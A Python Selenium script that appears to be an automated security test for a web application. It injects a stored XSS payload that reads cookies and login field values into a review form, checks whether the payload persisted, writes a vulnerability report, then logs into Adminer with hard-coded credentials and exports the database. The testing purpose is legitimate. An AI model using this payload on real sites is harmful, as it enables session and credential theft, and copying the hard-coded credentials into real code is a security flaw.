import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoAlertPresentException
from config.config import LOGIN_URL, REVIEW_URL, ADMIN_URL, USERNAME, PASSWORD
from utils.utils import capture_sensitive_data
from report_generators.dynamic_injection_report import generate_dynamic_report

def login_and_inject_xss(driver):
    """
    Logs in to the application and injects an XSS payload into the Review Page form.

    Args:
        driver (webdriver): The Selenium WebDriver instance.
    """
    try:
        # Step 1: Log in to the application
        driver.get(LOGIN_URL)
        time.sleep(2)
        driver.find_element(By.XPATH, '/html/body/div[1]/form/div[1]/input').send_keys(USERNAME)
        driver.find_element(By.XPATH, '/html/body/div[1]/form/div[2]/input').send_keys(PASSWORD)
        driver.find_element(By.XPATH, '/html/body/div[1]/form/input').click()
        time.sleep(3)

        # Step 2: Navigate to the Review Page and inject XSS script
        page_name = 'Review Page'
        driver.get(REVIEW_URL)
        time.sleep(2)

        xss_payload = """
            <script>
                alert("XSS Attack! Collecting sensitive data...");
                var cookies = document.cookie;
                var username = document.querySelector("input[name='username']") ? document.querySelector("input[name='username']").value : "not found";
                var password = document.querySelector("input[name='password']") ? document.querySelector("input[name='password']").value : "not found";
                console.log("Cookies: " + cookies);
                console.log("Username: " + username);
                console.log("Password: " + password);
            </script>
        """

        driver.find_element(By.XPATH, '/html/body/section[2]/div/form/textarea').send_keys(xss_payload)
        driver.find_element(By.XPATH, '/html/body/section[2]/div/form/button').click()
        time.sleep(2)

        # Handle the alert that appears from the XSS payload
        try:
            alert = driver.switch_to.alert
            print(f"Alert text: {alert.text}")
            alert.accept()  # Close the alert
            time.sleep(1)
        except NoAlertPresentException:
            print("No alert present.")

        # Step 3: Capture any sensitive data and prepare for the report
        vulnerabilities = []
        page_source = driver.page_source
        captured_data = capture_sensitive_data(driver)

        if "XSS Attack" in page_source:
            vulnerabilities.append({
                'type': 'XSS',
                'description': 'XSS vulnerability in form submission.',
                'impact': 'Allows script execution in user session.',
                'fix': 'Sanitize user input using HTML encoding.',
                'location': 'Form submission on the Review Page'
            })

            generate_dynamic_report(True, page_name, vulnerabilities, captured_data, page_source)
        else:
            generate_dynamic_report(False, page_name, vulnerabilities)
    except Exception as e:
        print(f"Error during XSS injection: {e}")


def verify_and_export_data(driver):
    """
    Verifies data persistence by accessing the Adminer database and exports the data.

    Args:
        driver (webdriver): The Selenium WebDriver instance.
    """
    try:
        # Step 4: Verify data in the Adminer database
        driver.get(ADMIN_URL)
        time.sleep(2)
        driver.find_element(By.XPATH, '/html/body/div[2]/form/table/tbody/tr[3]/td/input').send_keys("krossale")
        driver.find_element(By.XPATH, '/html/body/div[2]/form/table/tbody/tr[4]/td/input').send_keys("webove aplikace")
        driver.find_element(By.XPATH, '/html/body/div[2]/form/p/input').click()
        time.sleep(2)

        # Navigate to the target table and check data
        driver.find_element(By.XPATH, '/html/body/div[2]/form/table/tbody/tr[2]/th/a').click()
        time.sleep(1)
        driver.find_element(By.XPATH, '/html/body/div[2]/form/div[1]/table/tbody/tr[2]/th/a').click()
        time.sleep(1)
        driver.find_element(By.XPATH, '/html/body/div[2]/p[2]/a[1]').click()

        # Step 5: Export data
        driver.find_element(By.XPATH, '/html/body/div[2]/form[2]/div[2]/div/fieldset[4]/legend/a').click()
        time.sleep(1)
        driver.find_element(By.XPATH, '/html/body/div[2]/form[2]/div[2]/div/fieldset[4]/div/select[1]').click()
        time.sleep(1)
        driver.find_element(By.XPATH, '/html/body/div[2]/form[2]/div[2]/div/fieldset[4]/div/select[1]/option[2]').click()
        time.sleep(1)
        driver.find_element(By.XPATH, '/html/body/div[2]/form[2]/div[2]/div/fieldset[4]/div/input').click()

        print("Database entry verified and exported.")
    except Exception as e:
        print(f"Error during database verification: {e}")


def run_dynamic_injection_test():
    """
    Main function to run the dynamic injection test by executing both login/XSS injection and data verification/export steps.
    """
    driver = webdriver.Chrome()

    try:
        login_and_inject_xss(driver)  # Perform login and XSS injection
        verify_and_export_data(driver)  # Verify data in Adminer and export
    finally:
        driver.quit()
